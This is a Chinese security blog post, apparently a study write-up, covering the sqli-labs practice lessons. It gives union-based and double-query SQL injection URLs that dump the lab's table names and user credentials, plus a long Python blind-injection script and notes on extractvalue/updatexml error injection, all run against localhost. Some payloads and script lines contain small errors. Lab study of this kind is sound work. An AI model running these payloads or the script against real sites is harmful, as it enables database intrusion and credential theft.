<!DOCTYPE HTML>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<title>巩固sql注入</title>
<meta name="author" content="John Doe">
<!--[if IE]>
  <meta http-equiv=refresh content='0, http://browsehappy.com'>
<![endif]-->
<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css">
<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css">
<link rel="stylesheet" href="/css/style.css">


<body oncontextmenu="return false">
  <div class="aios_content">
    <div class="bg-gradient"></div>
    <div class="bg-pattern"></div>
    <div class="menu-bg">
  <div class="menu-container">
    <ul>
      
        <li class="menu-item">
          <a href="/">Home</a>
        </li>
      
        <li class="menu-item">
          <a href="/archives">Docs</a>
        </li>
      
    </ul>
  </div>
</div>

<nav>
  <a></a>
</nav>

    <div class="container" style="padding-bottom:40px">
      <div class="row">
  <div class="col-sm-12">
    <header>
  <div class="logo">
    <h1 id="main-title" class="title"><a href="/">The clown is laughing at you</a></h1>
  </div>
</header>


    <section class="main">
      <div class="post">
  <div class="post-header">
    <h1 class="title">巩固sql注入</h1>
    <div class="post-info">
      <span class="date">2019-01-28</span>

      
    </div>
  </div>

  <div class="content">
    <!-- Gallery -->
    

    <p><strong>0x01 认证绕过</strong><br>sqlilab 1<br>整个注入的流程：<br>数据库名–&gt;数据表名–&gt;字段名–&gt;数据名</p>
<p>此次的实验平台是sqlilab的第一题，我个人觉得第一题虽然最为简单，但是却最为重要，毕竟万事开头难嘛。<br>这里补充一些关于mysql的知识点：<br>mysql的数据库information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，用户权限等信息，下面说一下常用的几个表</p>
<p><strong>SCHEMATA表：储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。</strong></p>
<p><strong>TABLES表：储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表</strong></p>
<p><strong>COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show columns from schemaname.tablename的结果取之此表。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">information_schema.tables存储了数据表的元数据信息，下面对常用的字段进行介绍：</span><br><span class="line">table_schema: 记录数据库名；</span><br><span class="line">table_name: 记录数据表名；</span><br><span class="line">engine : 存储引擎；</span><br><span class="line">table_rows: 关于表的粗略行估计；</span><br><span class="line">data_length : 记录表的大小（单位字节）；</span><br><span class="line">index_length : 记录表的索引的大小；</span><br><span class="line">row_format: 可以查看数据表是否压缩过；</span><br></pre></td></tr></table></figure>
<p>我们先爆出数据所在的数据表的列数<br>    <code>http://localhost/sqlilab/Less-1/?id=1&#39; order by  4 --+</code><br><img src="/2019/01/28/巩固sql注入/1.png" alt="1"></p>
<p>发现错误，那么我们试试<br>    <code>http://localhost/sqlilab/Less-1/?id=1&#39; order by  3 --+</code><br><img src="/2019/01/28/巩固sql注入/2.png" alt="1"></p>
<p>说明有三列，那么接下来我们爆出它的数据库名，这道题是比较简单的认证绕过，因为源码中没有任何过滤所以就可以为所欲为。<br>爆它的数据库名：<br>   <code>http://localhost/sqlilab/Less-1/?id=-1&#39; union select 1,database(),version()--+</code><br><img src="/2019/01/28/巩固sql注入/3.png" alt="1"></p>
<p>数据库名已出，那么接下来爆出它的表名<br>   <code>http://localhost/sqlilab/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from  information_schema.tables where table_schema=&#39;security&#39;--+</code><br><img src="/2019/01/28/巩固sql注入/4.png" alt="1"></p>
<p>数据表名已出，接下来爆出它的字段名（我们这里爆email的字段名）<br>    <code>http://localhost/sqlilab/Less-1/?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27emails%27--+</code><br><img src="/2019/01/28/巩固sql注入/5.png" alt="1"></p>
<p><strong>之前爆不出数据表users的字段名：这下我发现正确的爆库payload是：</strong><br>    <code>http://localhost/sqlilab/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from  information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;--+</code></p>
<p>爆数据<br>    <code>http://localhost/sqlilab/Less-1/?id=-1&#39; union select id,email_id,3 from emails where id=1 --+</code><br><img src="/2019/01/28/巩固sql注入/6.png" alt="1"></p>
<p>这就出来了，实际上这里有些东西是可以通过脚本来进行自动化注入。<br>（剩下的2,3,4题观察其源码就知道稍微修改就好）</p>
<p><strong>0x02</strong><br>sqlilab 5<br>这道题有两个解法，一个是通过双注入，一个是通过盲注脚本<br>先讲第一个解法，通过双注入来完成注入，这里要补充一下mysql的一些知识：</p>
<p>先来一个很简单的例子：<br>select concat(select database());<br>这就是一个简单的双查询的过程，简单理解的情况下就是查询该数据库，通过concat()函数，concat()这个函数用于连接前后两个字符串，比如concat(‘a’,’b’)，结果就是ab.</p>
<p>学习几个常见双注入需要的函数/语法：</p>
<ol>
<li>Rand() //随机函数 </li>
<li>Floor() //取整函数</li>
<li>Count() //汇总函数</li>
<li>Group by clause //分组语句</li>
</ol>
<p>代码一：<br><img src="/2019/01/28/巩固sql注入/7.png" alt="1"></p>
<p>代码二：<br><img src="/2019/01/28/巩固sql注入/8.png" alt="1"></p>
<p>代码三：<br><img src="/2019/01/28/巩固sql注入/9.png" alt="1"></p>
<p>代码四：（在上面的代码加入from将会返回一个集合）<br><img src="/2019/01/28/巩固sql注入/10.png" alt="1"></p>
<p>代码五：（加入group by,使得相同的值被分到同一个分组）<br><img src="/2019/01/28/巩固sql注入/11.png" alt="1"></p>
<p>代码六：最后一步，在concat前加入聚合函数 count(*)<br><img src="/2019/01/28/巩固sql注入/12.png" alt="1"></p>
<p>现在我们来了解这道题，首先爆出列数，按照最简单的payload来<br>    <code>http://localhost/sqlilab/Less-5/?id=-1&#39; union select count(*),concat(&#39;*&#39;,(select database()),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a --+</code><br><img src="/2019/01/28/巩固sql注入/13.png" alt="1"><br>发现出现问题了，所以现在我们就可以去试出它的列数为3，<br>所以正确的payload为：<br>    <code>http://localhost/sqlilab/Less-5/?id=-1&#39; union select count(*),2，concat(&#39;*&#39;,(select, database()),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a --+</code><br>我们可以爆出它的数据库名为：<br><img src="/2019/01/28/巩固sql注入/14.png" alt="1"></p>
<p>爆出其数据表名：<br>    <code>http://localhost/sqlilab/Less-5/?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a --+</code><br><img src="/2019/01/28/巩固sql注入/15.png" alt="1"></p>
<p>爆出其字段名：<br>    <code>http://localhost/sqlilab/Less-5/?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),&#39;*&#39;,floor(rand(0)*2))as a from information_schema.tables group by a --+</code></p>
<p>接下来就按照常规的操作来获取其数据值：(可写脚本通过自动化注入)<br>    <code>?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select concat_ws(char(32,44,32),id,username,password) from users limit 1,1),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a --+</code></p>
<p><strong>0x03</strong><br>sqlilab 5（盲注）<br>这道题，这次使用盲注，我们通过认证绕过的payload会发现，如果注入成功，将会返回“You are in………”<br>关于布尔盲注的知识稍后再进行补充<br>放上脚本，我是把整个过程拆块儿进行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line">0x01</span><br><span class="line"># coding=UTF-8</span><br><span class="line">import re</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">#获取数据库名的长度</span><br><span class="line">#获取链接</span><br><span class="line"></span><br><span class="line">print(&quot;--------------------------------------------------------&quot;)</span><br><span class="line">print(&quot;开始获取数据库长度......&quot;)</span><br><span class="line">for x in range (0,20):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqlilabs/Less-5/?id=1&apos;and(length(database())=%d)--+&quot;%x</span><br><span class="line"># 获取页面内容</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    demo = r.text</span><br><span class="line">    </span><br><span class="line">#使用正则表达式判断demo中是否有与 &quot;you are in ......&quot; 相匹配的内容</span><br><span class="line">    try:</span><br><span class="line">      ans = re.compile(&quot;You are in&quot;).search(demo)#检测是否匹配到相关信息</span><br><span class="line">    except:</span><br><span class="line">      print &apos;fail to match&apos;  </span><br><span class="line">    if ans == None:#判断ans(&quot;You are in.......&quot;)是否在该页面中</span><br><span class="line">        print &apos;waiting for a moment........&apos;</span><br><span class="line">    else:</span><br><span class="line">        print &apos;the length of database is  %d&apos;%x</span><br><span class="line">        db_length = x</span><br><span class="line">        print &quot;获取数据库长度成功&quot;</span><br><span class="line">        print(&quot;--------------------------------------------------------&quot;)</span><br><span class="line">        break       </span><br><span class="line"></span><br><span class="line">#获取数据库名称</span><br><span class="line">print &quot;开始获取数据库名......&quot;</span><br><span class="line">#获取链接</span><br><span class="line">list = []</span><br><span class="line">for word in string.lowercase:</span><br><span class="line">    list.append(word)</span><br><span class="line">db_list=[]#该列表用于存储获取到的数据库的字符</span><br><span class="line">for x in range(1,db_length+1):</span><br><span class="line">    for y in list:</span><br><span class="line">      url = &quot;http://127.0.0.1/sqlilabs/Less-5/?id=1&apos;and(substr(database(),%d,1)=&apos;%%s&apos;)--+&quot;%x %y#这里注意使用%%s转义</span><br><span class="line">#获取页面内容</span><br><span class="line">      r = requests.get(url)</span><br><span class="line">      r.encoding = r.apparent_encoding</span><br><span class="line">      demo = r.text</span><br><span class="line">#对获取到的页面信息进行正则表达式匹配</span><br><span class="line">      try:</span><br><span class="line">          ans = re.compile(&quot;You are in&quot;).search(demo)  # 检测是否匹配到相关信息</span><br><span class="line">      except:</span><br><span class="line">          print &apos;fail to match&apos;</span><br><span class="line">      if ans != None:  # 判断ans(&quot;You are in.......&quot;)是否在该页面中</span><br><span class="line">          print &apos;the true letter of database is %s&apos; % y</span><br><span class="line">          print &apos;获取第%d个字母成功&apos; % x</span><br><span class="line">          break</span><br><span class="line">    db_list.append(y)</span><br><span class="line">db_name = &quot;&quot;.join(db_list)</span><br><span class="line">print &quot;the name of database is  &quot;+ db_name</span><br><span class="line">print &quot;获取数据库名成功&quot;</span><br><span class="line">print(&quot;--------------------------------------------------------&quot;)</span><br><span class="line"></span><br><span class="line">#获取该数据库中的数据表数目</span><br><span class="line">#获取链接</span><br><span class="line">db_name = &apos;security&apos;</span><br><span class="line">print(&quot;开始获取该数据库中的数据表数目......&quot;)</span><br><span class="line">for x in range(0, 50):</span><br><span class="line">    #这里又一个转义的问题需要关注</span><br><span class="line">    url = &quot;http://127.0.0.1/sqlilabs/Less-5/?id=1&apos;and(( SELECT count(*)  FROM information_schema.tables WHERE TABLE_SCHEMA = &apos;%s&apos;)=&apos;%d&apos;)--+&quot;%(db_name , x)</span><br><span class="line">    # 获取页面内容</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    demo = r.text</span><br><span class="line"></span><br><span class="line">    # 使用正则表达式判断demo中是否有与 &quot;you are in ......&quot; 相匹配的内容</span><br><span class="line">    try:</span><br><span class="line">        ans = re.compile(&quot;You are in&quot;).search(demo)  # 检测是否匹配到相关信息</span><br><span class="line">    except:</span><br><span class="line">        print &apos;fail to match&apos;</span><br><span class="line">    if ans != None:  # 判断ans(&quot;You are in.......&quot;)是否在该页面中</span><br><span class="line">        print &apos;the number of tables is  %d&apos; % x</span><br><span class="line">        table_count = x</span><br><span class="line">        print &quot;获取数据库表数目成功&quot;</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        print &apos;数据库表的数目不是%d&apos;%x     </span><br><span class="line">print &apos;获取数据库表数目成功,数目为%d&apos;%table_count        </span><br><span class="line"></span><br><span class="line">list = []</span><br><span class="line">for word in string.lowercase:</span><br><span class="line">    list.append(word)</span><br><span class="line">#获取数据库表,各个数据表名的长度以及数据表名</span><br><span class="line">for x in range(0,table_count):</span><br><span class="line">    print &apos;开始获取第%d个表的长度.....&apos;%x</span><br><span class="line">    for y in range(1,20):</span><br><span class="line">        url = &quot;http://127.0.0.1/sqlilabs/Less-5/?id=1&apos;and(ascii(substr((SELECT table_name FROM information_schema.tables WHERE TABLE_SCHEMA = &apos;%s&apos; limit %d,1),%d,1)))--+&quot;%(db_name,x,y)</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        demo = r.text</span><br><span class="line">        if &apos;You are in...........&apos; not in r.text:  # 判断ans(&quot;You are in.......&quot;)是否在该页面中</span><br><span class="line">            _table_length = y-1</span><br><span class="line">            print &apos;获取到此表的长度为:%d&apos;%_table_length</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    print &apos;开始获取该表的表名&apos;</span><br><span class="line">    table_name=[]</span><br><span class="line">    for y in range(0,_table_length+1):</span><br><span class="line">        for z in list:</span><br><span class="line">            url = &quot;http://127.0.0.1/sqlilabs/Less-5/?id=1&apos;and(substr((SELECT table_name FROM information_schema.tables where table_schema = &apos;%s&apos; limit %d,1),%d,1) = &apos;%s&apos;)--+&quot;%(db_name,x,y,z)</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            demo = r.text</span><br><span class="line">            if &apos;You are in...........&apos; in r.text:</span><br><span class="line">               table_name.append(z)</span><br><span class="line">               break</span><br><span class="line">    tb_name = &quot;&quot;.join(table_name)</span><br><span class="line">    print &apos;该表的名字为:&apos;+tb_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x02</span><br><span class="line"># coding=UTF-8</span><br><span class="line">import requests</span><br><span class="line">table_name = &apos;users&apos;</span><br><span class="line">#获取该表中的列数</span><br><span class="line">for i in range(1, 20):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqlilabs/Less-5/?id= 1&apos;and ((select count(column_name) from information_schema.columns where table_name = &apos;%s&apos;)=%d) --+&quot; % (table_name, i)</span><br><span class="line">    # 获取页面内容</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    if &apos;You are in...........&apos; in r.text:  # 判断ans(&quot;You are in.......&quot;)是否在该页面中</span><br><span class="line">        print &apos;the number of columns is  %d&apos; % i</span><br><span class="line">        column_count = i</span><br><span class="line">        print &quot;获取数据表列数目成功&quot;</span><br><span class="line">        break</span><br><span class="line">print &apos;获取%s表列数目成功,数目为%d&apos; % (table_name, column_count)</span><br><span class="line"></span><br><span class="line">#获取列的长度</span><br><span class="line">import string</span><br><span class="line">list = []</span><br><span class="line">for word in string.lowercase:</span><br><span class="line">    list.append(word)</span><br><span class="line">for x in range(0,column_count):</span><br><span class="line">    print &apos;开始获取第%d个列的长度.....&apos;%x</span><br><span class="line">    for y in range(1,20):</span><br><span class="line">        url = &quot;http://127.0.0.1/sqlilabs/Less-5/?id=1&apos;and(ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_name = &apos;%s&apos; limit %d,1),%d,1)))--+&quot;%(table_name,x,y)</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        demo = r.text</span><br><span class="line">        if &apos;You are in...........&apos; not in r.text:  # 判断ans(&quot;You are in.......&quot;)是否在该页面中</span><br><span class="line">            _column_length = y-1</span><br><span class="line">            print &apos;获取到此列的长度为:%d&apos;%_column_length</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">#获取数据库表中各列的名称</span><br><span class="line">    column_name=[]</span><br><span class="line">    for y in range(0, _column_length + 1):</span><br><span class="line">        for z in list:</span><br><span class="line">            url = &quot;http://127.0.0.1/sqlilabs/Less-5/?id=1&apos;and(substr((SELECT column_name FROM information_schema.columns where table_name = &apos;%s&apos; limit %d,1),%d,1) = &apos;%s&apos;)--+&quot; % (table_name, x, y, z)</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            demo = r.text</span><br><span class="line">            if &apos;You are in...........&apos; in r.text:</span><br><span class="line">                column_name.append(z)</span><br><span class="line">                break</span><br><span class="line">    co_name = &quot;&quot;.join(column_name)</span><br><span class="line">    print &apos;该列的名字为:&apos; + co_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x03</span><br><span class="line">#coding=UTF-8</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">database_name = &apos;security&apos;</span><br><span class="line">table_name = &apos;users&apos;</span><br><span class="line">column_name = &apos;username&apos;</span><br><span class="line">#获取该列的字段数目</span><br><span class="line">for i in range(1, 50):</span><br><span class="line">    url = &quot;http://127.0.0.1/sqlilabs/Less-5/?id= 1&apos;and ((select count(%s) from %s.%s)=%d) --+&quot; % (column_name,database_name,table_name,i)</span><br><span class="line">    # 获取页面内容</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    if &apos;You are in...........&apos; in r.text:  #</span><br><span class="line">        print &apos;the number of 该字段 is  %d&apos; % i</span><br><span class="line">        all_column_count = i</span><br><span class="line">        print &quot;获取字段总数目成功,数目是:%d&quot;%all_column_count</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#获取字段的长度</span><br><span class="line">list = []</span><br><span class="line">for word in string.lowercase:</span><br><span class="line">    list.append(word)</span><br><span class="line">for x in range(0,all_column_count):</span><br><span class="line">    print &apos;开始获取第%d个字段的长度.....&apos;%x</span><br><span class="line">    for y in range(1,20):</span><br><span class="line">        url = &quot;http://127.0.0.1/sqlilabs/Less-5/?id=1&apos;and(ascii(substr((SELECT %s FROM %s.%s limit %d,1),%d,1)))--+&quot;%(column_name,database_name,table_name,x,y)</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        demo = r.text</span><br><span class="line">        if &apos;You are in...........&apos; not in r.text:  # 判断ans(&quot;You are in.......&quot;)是否在该页面中</span><br><span class="line">            dump_length = y-1</span><br><span class="line">            print &apos;获取到此字段的长度为:%d&apos;%dump_length</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">#获取该字段内容</span><br><span class="line">    dump_name=[]</span><br><span class="line">    for y in range(0, dump_length-1):</span><br><span class="line">        for z in (0,256):</span><br><span class="line">            url = &quot;http://127.0.0.1/sqlilabs/Less-5/?id=1&apos;and(ascii(substr((SELECT %s FROM %s.%s limit %d,1),%d,1)) = %d)--+&quot; %(column_name,database_name,table_name, x, y, z)</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            demo = r.text</span><br><span class="line">            if &apos;You are in...........&apos; in r.text:</span><br><span class="line">                t=chr(z)  </span><br><span class="line">                dump_name.append(t)</span><br><span class="line">                break</span><br><span class="line">    this_dump_name = &quot;&quot;.join(dump_name)</span><br><span class="line">    print this_dump_name</span><br></pre></td></tr></table></figure></p>
<p>这是我整个注入的过程，有不好的地方，代码还会再进行修改。</p>
<p>第六题和第五题一样，只要对payload稍作修改就好。</p>
<p><strong>0x04</strong><br>报错注入：<br>知识点链接:<br>(<a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036)[https://blog.csdn.net/zpy1998zpy/article/details/80631036]" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80631036)[https://blog.csdn.net/zpy1998zpy/article/details/80631036]</a><br>这里我们要学习一下<br>基于extractvalue()和updatexml()的报错注入<br>具体内容看上面的链接,反正都是从别人那儿搬来的知识点,我就不重复了.</p>
<p>extractvalue(): 对XML文档进行查询的函数<br>语法：extractvalue(目标xml文档，xml路径)<br>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。<br>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))</p>
<p>updatexml():<br>updatexml()函数与extractvalue()类似，是更新xml文档的函数。<br>关于updatexml()的知识点:<a href="http://www.cnblogs.com/AmoBlogs/p/8673748.html" target="_blank" rel="noopener">http://www.cnblogs.com/AmoBlogs/p/8673748.html</a><br>语法updatexml(目标xml文档，xml路径，更新的内容)<br>select username from security.user where id=1 and (updatexml(‘anything’,’/xx/xx’,’anything’))</p>

    <span class="date end-date">2019-01-28</span>
  </div>

  

  
</div>

    </section>
  </div>
</div>

    </div>
  </div>
  <footer class="footer-content">
  <div class="container">
    <div class="row">
      <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
        <h2>About</h2>
        <section>
          Theme developed by <a href="//github.com/klugjo" target="_blank">Jonathan Klughertz</a><br>Contents created by <a href="//github.com/xaios" target="_blank">AIOS</a>
        </section>
      </div>
      
  <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
    <h2>New Contents</h2>
    <ul>
      
        <li>
          <a class="footer-post" href="/2019/02/24/数据库的备份与还原/">数据库的备份与还原</a>
        </li>
      
        <li>
          <a class="footer-post" href="/2019/02/21/interesting/">interesting</a>
        </li>
      
        <li>
          <a class="footer-post" href="/2019/02/18/几道实验吧的web题/">几道实验吧的web题</a>
        </li>
      
        <li>
          <a class="footer-post" href="/2019/02/12/PHPMywind储存XSS漏洞/">PHPMywind储存XSS漏洞</a>
        </li>
      
    </ul>
  </div>


      

    </div>
    <div class="row">
      <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
        <ul class="list-inline footer-social-icons"></ul>
      </div>
    </div>
    <div class="row">
      <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
        <div class="footer-copyright">@Untitled. All right reserved | Design & Hexo <a href="//www.codeblocq.com" target="_blank">Jonathan Klughertz</a></div>
      </div>
    </div>
  </div>
</footer>

</body>
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js"></script>
<script src="/js/main.js"></script>

